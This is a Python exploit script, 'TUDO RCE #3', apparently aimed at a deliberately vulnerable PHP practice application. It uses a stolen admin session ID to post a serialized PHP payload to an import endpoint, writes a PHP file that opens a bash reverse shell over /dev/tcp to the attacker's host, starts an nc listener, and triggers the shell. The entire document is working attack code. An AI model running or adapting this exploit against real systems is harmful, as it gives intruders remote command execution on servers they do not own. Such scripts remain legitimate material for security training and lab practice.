#!/usr/bin/python3

# @title  TUDO RCE #3
# @author William Moody
# @date   10.03.2021

import requests
import sys
import subprocess
import string
import random
import base64
import time

if len(sys.argv) != 4:
	print("usage: %s TARGET HOST ADMIN_PHPSESSID" % sys.argv[0])
	sys.exit(-1)

target = sys.argv[1]
host   = sys.argv[2]
sessid = sys.argv[3]

lport = 9001
evil = ''.join(random.choice(string.ascii_letters) for _ in range(10))

f = "/var/www/html/%s.php"%evil
c = "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1'\"); ?>"%(host,lport)
c = base64.urlsafe_b64encode(c.encode("UTF-8")).decode("UTF-8")

proc = subprocess.Popen("php serialize.php '%s' '%s'"%(f,c),shell=True,stdout=subprocess.PIPE)
payload = proc.stdout.read()
print("[+] Generated payload!")

def import_user():
	c = {"PHPSESSID":sessid}
	d = {"userobj":payload}
	r = requests.post("http://%s/admin/import_user.php"%target,data=d,cookies=c)

import_user()
print("[*] Sent import user request (%s.php)"%(evil))

print("[*] Attempting to start reverse shell...")
subprocess.Popen(["nc","-nvlp","%d"%lport])
time.sleep(1)
requests.get("http://%s/%s.php"%(target,evil))

while True:
	pass
